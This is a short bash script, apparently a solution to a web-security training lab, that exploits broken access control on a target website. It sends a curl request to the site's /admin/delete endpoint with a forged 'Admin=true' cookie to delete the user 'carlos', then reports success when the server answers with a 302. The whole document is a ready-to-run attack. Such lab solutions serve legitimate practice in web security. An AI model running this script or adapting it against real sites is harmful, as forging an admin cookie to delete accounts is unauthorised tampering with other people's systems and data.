#!/bin/bash

delete_user() {

    delete_user="${url}/admin/delete?username=carlos"
    echo "(+) Deleting user carlos..."
    response=$(curl -s -o /dev/null -w "%{http_code}" "${delete_user}" -b "Admin=true")
    
    if [[ "${response}" -eq 302 ]]; then
        echo "(+) Deleted user Carlos successfully!"
    else
        echo "(-) Something went wrong! Could not deleter user Carlos."
        echo "(-) Exiting..."
    fi
}

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url="$1"
    delete_user "$url"
}

main "$@"
